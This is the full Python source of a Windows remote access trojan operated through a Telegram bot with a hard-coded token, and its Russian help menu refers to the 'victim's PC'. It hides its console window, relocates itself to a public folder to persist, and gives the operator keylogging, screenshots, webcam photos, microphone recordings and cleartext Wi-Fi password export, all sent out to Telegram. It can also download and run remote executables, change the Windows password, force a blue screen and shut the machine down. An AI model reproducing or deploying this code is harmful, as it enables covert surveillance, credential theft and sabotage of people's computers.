import os
import sys

if sys.stdout is sys.__stdout__:
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

print("Скрипт работает без отображения консоли")



import shutil
import subprocess
import sys

required_modules = [
    'telebot', 'pillow', 'requests', 'pygame',
    'pynput', 'pyautogui', 'rotate-screen', 'psutil',
    'requests', 'comtypes', 'pycaw', 'pythoncom',
    'random', 'ctypes','pywin32', 'opencv-python',
    'sounddevice', 'scipy', 'wavio'
]

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for module in required_modules:
    try:
        __import__(module if module != 'opencv-python' else 'cv2')
    except ImportError:
        print(f"Устанавливается модуль: {module}")
        install(module)



import telebot
from telebot import types
import os
from PIL import ImageGrab

import urllib.request
import pygame

from pynput import keyboard
import datetime

import time

import pyautogui
import rotatescreen
import psutil

import requests
import platform

from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

import pythoncom

import subprocess
import getpass
import sys

import random

import ctypes
from ctypes import *

import win32api
import win32gui
import win32con

import cv2
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
from multiprocessing import Process

try:
    if getattr(sys, 'frozen', False):
        script_path = sys.executable
    else:
        script_path = os.path.abspath(__file__)

    print(f"Script path: {script_path}")

    config_path = os.path.join(os.path.dirname(script_path), 'oved_config.txt')

    print(f"Config path: {config_path}")

    if not os.path.exists(config_path) or not open(config_path, 'r', encoding='utf-8').read().strip() == 'oved=true':
        target_path = os.path.join('C:\\Users\\Public', os.path.basename(script_path))

        print(f"Target path: {target_path}")

        shutil.move(script_path, target_path)
        print(f"Script moved to {target_path}")

        with open(config_path, 'w', encoding='utf-8') as config_file:
            config_file.write('oved=true')

        print(f"Configuration updated at {config_path}")

        subprocess.Popen([target_path])
        print(f"Script restarted from {target_path}")

        sys.exit()
    else:
        print('Script already moved.')

except Exception as e:
    print(f'Error: {e}')

def send_audio(bot, chat_id):
    with open(r"C:\Users\Public\recorded.wav", "rb") as f:
        bot.send_document(chat_id, f)
        f.close()
        os.remove(r"C:\Users\Public\recorded.wav")

bot = telebot.TeleBot('8105443469:AAGhXkOsqBAYQFoCK_FTFktPS8RPrV_v-FY')

def micro_phone(i):
    freq = 44100
    duration = i
    recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
    sd.wait()
    write(r"C:\Users\Public\recorded.wav", freq, recording)
    wv.write(r"C:\Users\Public\recorded.wav", recording, freq, sampwidth=2)

def setEngLayout():
    window_handle = win32gui.GetForegroundWindow()
    result = win32api.SendMessage(window_handle, 0x0050, 0, 0x04090409)
    return result

def Keylogs():
    class KeyLog():
        def __init__(self, filename: str = "C:\\Users\\Public\\logs.txt") -> None:
            self.filename = filename
            text = '''Keylog v2.0 
<96> - 0
<97> - 1
<98>  - 2
<99>  - 3
<100>  - 4
<101>  - 5
<102>  - 6
<103>  - 7 
<104>  - 8
<105>  - 9'''
            self.filename = r"C:\Users\Public\logs.txt"
            with open(self.filename, 'a') as logs:
                logs.write(text + "\n")

        @staticmethod
        def get_char(key):
            try:
                return key.char
            except AttributeError:
                return str(key)

        def on_press(self, key):
            print(str(key))
            with open(self.filename, 'a') as logs:
                dt_now = datetime.datetime.now()
                logs.write(str(dt_now) + str(":   ") + self.get_char(str(key)) + "\n")

        def main(self):
            listener = keyboard.Listener(on_press=self.on_press)
            listener.start()

    if __name__ == '__main__':
        logger = KeyLog()
        logger.main()


@bot.message_handler(commands=['keylog'])
def website(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    start = types.KeyboardButton("start keylog")
    stop = types.KeyboardButton("stop keylog")
    markup.add(start,stop)
    bot.send_message(message.chat.id, 'Запуститье кейлогер', reply_markup=markup)


@bot.message_handler(commands=["help"])
def My_PC(message):
    username = os.getlogin()
    text = ('''<b>Ты можешь управлять пк '''+ str(username) +'''
1. Открыть какой-то сайт - /website
2. Выключить ПК - /reboot
3. Перезапуск ПК - /restart
4. Выключить WIFI - /break_wifi
5. Запустиь кейлогер - /keylog
6. Перевернуть экран - /revers_monitor
7. Сделать скриншот - /screenshot
8. Изменение звука - /sound
9. Изменить пароль на Windows - /password
10. Прикол - /HEHEHEHA
11. Узнать инфу о пк - /info
12. Закрыть какой-то процесс - /kill_process + cmd.exe и тд.
13. Открыть сайт по ссылке - /sites (https://....)
14. Синий экран смерти - /blue_screen
15. Запись с микрофона - /microo
16. Сделать фото с камеры - /web_camera
17. Скачать какой-exe файл /downloads https://....</b>
18. Узнать к каким wifi был подключен пк - /wifi
19. Узнать к какому wifi подключён пк щас - /real_wifi
20. Пароли от всех wifi - /wifi_password
21. Автозагрузка - /aurostart
22. Выйти из системы снести автозагрузку удалить логи и тд. - /exit''')
    bot.send_message(message.chat.id, text, parse_mode='html')
    bot.send_message(message.chat.id, "Создание папки где будет лежить keyloger")
    try:
        os.mkdir("C:\\Users\\Public\\")
        bot.send_message(message.chat.id, "Папка создана C:\\Users\\Public\\ там будет лежать keyloger")
    except:
        bot.send_message(message.chat.id, "Либо такая папка уже есть либо какая та ошибка")



@bot.message_handler(commands=["screenshot"])
def screenshot(message):
    screenshot = ImageGrab.grab() 
    screenshot.save(r'C:\Users\Public\my_screenshot.png') 
    time.sleep(2)
    logo1 = open(r"C:\Users\Public\my_screenshot.png", "rb")
    bot.send_document(message.chat.id, logo1)
    logo1.close()
    time.sleep(1)
    os.remove(r"C:\Users\Public\my_screenshot.png")



@bot.message_handler(commands=['kill_process_rat'])
def kill_process_rat(message):
    bot.send_message(message.chat.id, "Выключаю rat")
    time.sleep(1)
    sys.exit()


@bot.message_handler(commands=['info', 'Info'])
def ip(message):
    try:
        username = os.getlogin()

        r = requests.get('https://api.ipify.org')
        ip = r.text
        windows = platform.platform()
        processor = platform.processor()

        bot.send_message(message.chat.id, 'PC: ' + username + '\nIP: ' + ip + '\nOS: ' + windows + '\nProcessor: ' + processor)

    except:
        bot.send_message(message.chat.id, "Ошибка")


@bot.message_handler(commands=['kill_process'])
def kill_process(message):
    try:
        user_msg = '{0}'.format(message.text)
        subprocess.call('taskkill /IM ' + user_msg.split(' ')[1])
        bot.send_message(message.chat.id, 'Отлично!')

    except:
        bot.send_message(message.chat.id, 'Ошибка')


@bot.message_handler(commands=['blue_screen'])
def blue_screen(message):
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6)


@bot.message_handler(commands=['wifi'])
def wifi(message):
    def get_wifi_profiles():
        try:
            output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True,
                                    encoding='cp866')
            return output.stdout
        except:
            bot.send_message(message.chat.id, "Какая та ошибка")
            return None

    output = get_wifi_profiles()
    if output:
        bot.send_message(message.chat.id, output)


@bot.message_handler(commands=['real_wifi'])
def wifi(message):
    def get_wifi_profiles():
        try:
            output = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True,
                                      encoding='cp866')
            return output.stdout
        except:
            bot.send_message(message.chat.id, "Какая та ошибка")
            return None

    output = get_wifi_profiles()
    if output:
        bot.send_message(message.chat.id, output)


@bot.message_handler(commands=['wifi_password'])
def wifi_password(message):
    try:
        subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True, text=True,
                                encoding='cp866')

        path = os.getcwd()
        wifi_files = []

        for filename in os.listdir(path):
            if filename.endswith(".xml"):
                wifi_files.append(filename)

        for i in wifi_files:
            with open(i, 'rb') as xml:
                bot.send_document(message.chat.id, xml)
                xml.close()
            os.remove(i)

    except:
        bot.send_message(message.chat.id, "Какая та ошибка")


@bot.message_handler(commands=['sites'])
def  web_sites(message):
    try:
        user_msg = '{0}'.format(message.text)
        os.system('start ' + user_msg.split(' ')[1])
        bot.send_message(message.chat.id, 'OK')

    except:
        bot.send_message(message.chat.id, 'Error')


@bot.message_handler(commands=['sound'])
def sound(message):
    try:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        hungred = types.KeyboardButton("set_sound_100%")
        fifty = types.KeyboardButton("set_sound_50%")
        twenty_five = types.KeyboardButton("set_sound_25%")
        ten = types.KeyboardButton("set_sound_10%")
        zero = types.KeyboardButton("set_sound_0%")
        markup.add(hungred, fifty, twenty_five, ten, zero)
        bot.send_message(message.chat.id, 'Изминить громкость', reply_markup=markup)
    except:
        bot.send_message(message.chat.id, 'Error')

add = 0

@bot.message_handler(commands=["HEHEHEHA"])
def open_cmd(message):
    global add
    command = 'color 4 & FOR /L %N IN () DO @echo CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR CRITICAL ERROR '
    subprocess.Popen(['start', 'cmd', '/k', command], shell=True)
    time.sleep(0.4)

    def press_f11():
        f11_key_code = win32api.MapVirtualKey(win32con.VK_F11, 0)

        win32api.keybd_event(win32con.VK_F11, f11_key_code)

        win32api.keybd_event(win32con.VK_F11, f11_key_code, win32con.KEYEVENTF_KEYUP)

    press_f11()

    time.sleep(2)

    def create_bat_file(content):
        with open('script.bat', 'w') as file:
            file.write(content)


    content = '''taskkill /IM explorer.exe /F
echo.%_WinSysPath%win32k.sys if exist %_WinSysPath%win32k.old ( del %_WinSysPath%win32k.old )
echo.Could not find %_WinSysPath%win32k5.sys
pause'''

    create_bat_file(content)
    os.system("script.bat")

    try:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        stop = types.KeyboardButton("stop_sound")
        hungred = types.KeyboardButton("set_sound_100%")
        fifty = types.KeyboardButton("set_sound_50%")
        twenty_five = types.KeyboardButton("set_sound_25%")
        ten = types.KeyboardButton("set_sound_10%")
        zero = types.KeyboardButton("set_sound_0%")
        script_bat = types.KeyboardButton("script_bat")
        blue_screen = types.KeyboardButton("Синька")
        markup.add(stop, hungred, fifty, twenty_five, ten, zero, script_bat, blue_screen)
        bot.send_message(message.chat.id, 'Изминить громкость', reply_markup=markup)

        url = 'https://github.com/Vova2808/Music_mem/raw/main/SIRENA_100DB.mp3'
        urllib.request.urlretrieve(url, "file" + str(add) + ".mp3")
        bot.send_message(message.chat.id, "Идёт загрузка", parse_mode='html')
        bot.send_message(message.chat.id, "3", parse_mode='html')
        time.sleep(1)
        bot.send_message(message.chat.id, "2", parse_mode='html')
        time.sleep(1)
        bot.send_message(message.chat.id, "1", parse_mode='html')
        time.sleep(1)
        bot.send_message(message.chat.id, "0", parse_mode='html')

        pygame.init()

        pygame.mixer.music.load("file" + str(add) + ".mp3")
        add = add + 1

        print(add)
        pygame.mixer.music.play()

        MUSIC_END = pygame.USEREVENT + 1
        pygame.mixer.music.set_endevent(MUSIC_END)


        script = 0


        while True:
            os.system("start https://youareanidiot.cc/")

            press_f11()

            time.sleep(0.3)
            pyautogui.click(x=400, y=400)
            time.sleep(0.2)
            script = script + 1


    except:
        bot.send_message(message.chat.it, "Error")


@bot.message_handler(commands=['microo'])
def mecro(message):
    try:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        sec_5 = types.KeyboardButton("5_sec")
        sec_10 = types.KeyboardButton("10_sec")
        sec_15 = types.KeyboardButton("15_sec")
        sec_20 = types.KeyboardButton("20_sec")
        markup.add(sec_5, sec_10, sec_15, sec_20)
        bot.send_message(message.chat.id, 'Сколько будет записываться звук с микро ', reply_markup=markup)
    except:
        bot.send_message(message.chat.it, "Error")


@bot.message_handler(commands=['microphone'])
def microphone(message):
    try:
        user_msg = '{0}'.format(message.text)
        bot.send_message(message.chat.id, f'Запись с микро на {user_msg.split(' ')[1]} секунд')
        micro_phone(int(user_msg.split(' ')[1]))
        time.sleep(int(user_msg.split(' ')[1])+2)
        bot.send_message(message.chat.id, "Вот на лови")
        send_audio(bot, message.chat.id)
    except:
        bot.send_message(message.chat.id, 'Error')


@bot.message_handler(commands=['password'])
def password(message):
    bot.send_message(message.chat.id, "Если программа на жертве ПК не запущена от имени админестратора то не чего не получиться")
    def change_password(username, new_password):
        command = f"net user {username} {new_password}"
        subprocess.run(command, shell=True)

    try:
        username = getpass.getuser()
        new_password = random.randint(12340985, 98479359)
        change_password(username, new_password)
        bot.send_message(message.chat.id, "Пароль "
                                          ""
                                          ""
                                          ""
                                          ""
                                          "был изменён на ", new_password)
        windll.user32.LockWorkStation()
    except:
        bot.send_message(message.chat.id, "Пароль не был изменён прога не была запущена от админки")


@bot.message_handler(commands=['exit'])
def exut(message):
    try:
        bot.send_message(message.chat.id, "Удаление кейлогера и bat с автозагрузкой")
        USER_NAME = getpass.getuser()
        bot.send_message(message.chat.id, 'Удаление bat с автозагрузкой')
        os.system(f'del "C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Yandex.bat"')
        bot.send_message(message.chat.id, "Удаление файла с логами нажитий клавишь")
        os.system(r"del C:\Users\Public\logs.txt")
        bot.send_message(message.chat.id, "Всё ОК")
        bot.send_message(message.chat.id, '''Теперь можно либо выключить или перезапустить или выкинуть синий экран смерти
1. /blue_screen - синька
2. /reboot - Выключить ПК
3. /restart - Перезапуск ПК
4. /kill_process_rat - Закрыть RAT''')

    except:
        bot.send_message(message.chat.id, "Неудалось удалить файлы")


@bot.message_handler(commands=['start'])
def website(message):
    try:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        youtube = types.KeyboardButton("start https://www.youtube.com/")
        tiktok = types.KeyboardButton("start https://www.tiktok.com")
        steam = types.KeyboardButton("start https://steamcommunity.com/")
        powershell = types.KeyboardButton("start powershell")
        cmd = types.KeyboardButton("start cmd")
        explorer = types.KeyboardButton("start explorer")
        markup.add(youtube, tiktok, steam, powershell, cmd, explorer)
        username = os.getlogin()
        bot.send_message(message.chat.id, f'Привет это бот который может управлять пк {username} если что-то не понятно напишите /help', reply_markup=markup)
    except:
        bot.send_message(message.chat.it, "Error")

@bot.message_handler(commands=['revers_monitor'])
def website(message):
    try:
        bot.send_message(message.chat.id, "<b>Ты можишь переворачивать экран</b>", parse_mode='html')
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        youtube = types.KeyboardButton("Обратно")
        tiktok = types.KeyboardButton("Перевернть")
        steam = types.KeyboardButton("Право")
        powershell = types.KeyboardButton("Лево")
        off_monitor = types.KeyboardButton("Выкл Монитор")
        on_monitor = types.KeyboardButton("Вкл Монитор")
        markup.add(youtube, tiktok, steam, powershell, off_monitor,on_monitor)
        bot.send_message(message.chat.id, 'Выбирите сайт', reply_markup=markup)
    except:
        bot.send_message(message.chat.it, "Error")

@bot.message_handler(commands=['website'])
def website(message):
    try:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        youtube = types.KeyboardButton("start https://www.youtube.com/")
        tiktok = types.KeyboardButton("start https://www.tiktok.com")
        steam = types.KeyboardButton("start https://steamcommunity.com/")
        red = types.KeyboardButton("start https://catherineasquithgallery.com/uploads/posts/2021-02/1612856320_62-p-krasnii-fon-kvadratnii-71.jpg")
        you_are_idiot = types.KeyboardButton("start https://youareanidiot.cc/")
        powershell = types.KeyboardButton("start powershell")
        cmd = types.KeyboardButton("start cmd")
        explorer = types.KeyboardButton("start explorer")
        red = types.KeyboardButton("Красный Фон")
        off_monitor = types.KeyboardButton("Выкл Монитор")
        on_monitor = types.KeyboardButton("Вкл Монитор")
        markup.add(youtube, tiktok, steam, powershell, cmd, explorer, off_monitor, on_monitor, you_are_idiot)
        bot.send_message(message.chat.id, 'Выбирите сайт', reply_markup=markup)
    except:
        bot.send_message(message.chat.it, "Error")

@bot.message_handler(commands=['reboot'])
def reboot(message):
    bot.send_message(message.chat.id, "Выключение", parse_mode='html')
    os.system("shutdown /s /t 0")


@bot.message_handler(commands=['downloads'])
def kill_process(message):
    try:
        user_msg = '{0}'.format(message.text)
        bot.send_message(message.chat.id, "Загрузка")
        urllib.request.urlretrieve(user_msg.split(' ')[1], "file" + ".exe")
        time.sleep(1)
        os.system('file.exe')
        bot.send_message(message.chat.id, 'Отлично!')

    except:
        bot.send_message(message.chat.id, 'Ошибка')


@bot.message_handler(commands=['web_camera'])
def camera(message):
    try:
        cap = cv2.VideoCapture(0)

        for i in range(30):
            cap.read()

        ret, frame = cap.read()
        cv2.imwrite(r'C:\Users\Public\photo.png', frame)
        cap.release()
        time.sleep(1)
        _logo1 = open(r"C:\Users\Public\photo.png", "rb")
        bot.send_document(message.chat.id, _logo1)
        _logo1.close()
        os.remove(r'C:\Users\Public\photo.png')

    except:
        bot.send_message(message.chat.id, 'Ошибка кажется нету камеры')


@bot.message_handler(commands=["restart"])
def start(message):
    text = 'Перезапуск'
    os.system('shutdown /r /t 0')
    bot.send_message(message.chat.id, text, parse_mode='html')


@bot.message_handler(commands=['break_wifi'])
def wifi(message):
    try:
        os.system('netsh wlan disconnect')
        bot.send_message(message.chat.id, "Всё ок Wifi отключен")
    except:
        bot.send_message(message.chat.id, "Ошибка")



i = 0

def play_music(file):
    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load(file)
    pygame.mixer.music.play()


@bot.message_handler(content_types=['text'])
def get_user_text(message):
    try:
        global i


        if message.text == 'start keylog':
            bot.send_message(message.chat.id, "Кейлогер Запущен")
            Keylogs()
            time.sleep(1)
            pyautogui.write('t')


        if message.text == "stop keylog":
            try:
                logo = open("C:\\Users\\Public\\logs.txt", "rb")
                bot.send_document(message.chat.id, logo)
                logo.close()

            except:
                bot.send_message(message.chat.id, "Какая та ошибка")

        pythoncom.CoInitialize()

        if message.text.startswith("https://"):
            try:
                markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
                stop = types.KeyboardButton("stop_sound")
                hungred = types.KeyboardButton("set_sound_100%")
                fifty = types.KeyboardButton("set_sound_50%")
                twenty_five = types.KeyboardButton("set_sound_25%")
                ten = types.KeyboardButton("set_sound_10%")
                zero = types.KeyboardButton("set_sound_0%")
                blue_screen = types.KeyboardButton("Синька")
                markup.add(stop, hungred, fifty, twenty_five, ten, zero, blue_screen)
                bot.send_message(message.chat.id, 'Изминить громкость', reply_markup=markup)

                url = message.text
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                }

                try:
                    response = requests.get(url, headers=headers)
                    with open(r"C:\Users\Public\file" + str(i) + ".mp3", 'wb') as file:
                        file.write(response.content)

                    bot.send_message(message.chat.id, "Идёт загрузка", parse_mode='html')
                    bot.send_message(message.chat.id, "3", parse_mode='html')
                    time.sleep(1)
                    bot.send_message(message.chat.id, "2", parse_mode='html')
                    time.sleep(1)
                    bot.send_message(message.chat.id, "1", parse_mode='html')
                    time.sleep(1)
                    bot.send_message(message.chat.id, "0", parse_mode='html')

                    pygame.init()

                    pygame.mixer.music.load(r"C:\Users\Public\file" + str(i) + ".mp3")
                    i += 1

                    print(i)
                    pygame.mixer.music.play()

                    MUSIC_END = pygame.USEREVENT + 1
                    pygame.mixer.music.set_endevent(MUSIC_END)

                except requests.exceptions.RequestException as e:
                    bot.send_message(message.chat.id, f"Ошибка загрузки файла: {e}")

            except:
                bot.send_message(message.chat.it, "Error кажется файл не mp3 или ссылка не рабочая ")


        elif message.text == "stop_sound":
            try:

                bot.send_message(message.chat.id, "Выклчение музыки")
                pygame.quit()
                bot.send_message(message.chat.id, "OK")
                bot.send_message(message.chat.id, "Удаление музыки")
                os.remove(r"C:\Users\Public\file" + str(i) + ".mp3")
                bot.send_message(message.chat.id, "OK")

            except:
                pygame.quit()
                bot.send_message(message.chat.id, "Error может быть файл mp3 не работает")
                try:
                    bot.send_message(message.chat.id, "Удаление mp3")
                    os.remove("file" + str(i) + ".mp3")
                    bot.send_message(message.chat.id, "OK")
                except:
                    bot.send_message(message.chat.id,"Не удалось удалить файл mp3")


        elif message.text == "script_bat":
            os.system("script.bat")
            bot.send_message(message.chat.id, "Всё заробило")


        elif message.text == "start https://youareanidiot.cc/":
            os.system("start https://youareanidiot.cc/")
            bot.send_message(message.chat.id, "OK")

        elif message.text == "set_sound_100%":
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))

            volume.SetMasterVolumeLevel(-0.0, None)

        elif message.text == "set_sound_50%":
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))

            volume.SetMasterVolumeLevel(-9.2, None)

        elif message.text == "set_sound_25%":
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))

            volume.SetMasterVolumeLevel(-17.7, None)

        elif message.text == "set_sound_10%":
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))

            volume.SetMasterVolumeLevel(-26.0, None)

        elif message.text == "set_sound_0%":
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))

            volume.SetMasterVolumeLevel(-37.0, None)


        elif message.text == "Обратно":
            screen = rotatescreen.get_primary_display()
            screen.rotate_to(0)

        elif message.text == "Перевернть":
            screen = rotatescreen.get_primary_display()
            screen.rotate_to(180)

        elif message.text == "Право":
            screen = rotatescreen.get_primary_display()
            screen.rotate_to(270)

        elif message.text == "Лево":
            screen = rotatescreen.get_primary_display()
            screen.rotate_to(90)

        elif message.text == 'Синька':
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6)

        
        elif message.text == "start https://www.youtube.com/":
            os.system("start https://www.youtube.com/")

        elif message.text == "start https://www.tiktok.com":
            os.system("start https://www.tiktok.com")

        elif message.text == "start https://steamcommunity.com/":
            os.system("start https://steamcommunity.com/")

        elif message.text == "start powershell":
            os.system("start powershell")

        elif message.text == "start cmd":
            os.system("start cmd")

        elif message.text == "start explorer":
            os.system("start explorer")

        elif message.text == "Выкл Монитор":
            win32gui.SendMessage(win32con.HWND_BROADCAST,
                                 win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)

        elif message.text == "Вкл Монитор":
            win32gui.SendMessage(win32con.HWND_BROADCAST,
                                 win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)



        elif message.text == "5_sec":
            try:
                bot.send_message(message.chat.id, 'Запись с микро на 5 секунд')
                micro_phone(5)
                time.sleep(7)
                bot.send_message(message.chat.id, "Вот на лови")
                send_audio(bot, message.chat.id)
            except:
                bot.send_message(message.chat.id, 'Error')

        elif message.text == "10_sec":
            try:
                bot.send_message(message.chat.id, 'Запись с микро на 10 секунд')
                micro_phone(10)
                time.sleep(12)
                bot.send_message(message.chat.id, "Вот на лови")
                send_audio(bot, message.chat.id)
            except:
                bot.send_message(message.chat.id, 'Error')

        elif message.text == "15_sec":
            try:
                bot.send_message(message.chat.id, 'Запись с микро на 15 секунд')
                micro_phone(15)
                time.sleep(17)
                bot.send_message(message.chat.id, "Вот на лови")
                send_audio(bot, message.chat.id)

            except:
                bot.send_message(message.chat.id, 'Error')

        elif message.text == "20_sec":
            try:
                bot.send_message(message.chat.id, 'Запись с микро на 20 секунд')
                micro_phone(20)
                time.sleep(22)
                bot.send_message(message.chat.id, "Вот на лови")
                send_audio(bot, message.chat.id)

            except:
                bot.send_message(message.chat.id, 'Error')

        elif message.text == "30_sec":
            try:
                bot.send_message(message.chat.id, 'Запись с микро на 30 секунд')
                micro_phone(20)
                time.sleep(22)
                bot.send_message(message.chat.id, "Вот на лови")
                send_audio(bot, message.chat.id)
            except:
                bot.send_message(message.chat.id, 'Error')

        else:
            bot.send_message(message.chat.id, "Такой команды нету напишите /help")

    except:
        bot.send_message(message.chat.id, 'Error')



bot.polling(none_stop=True)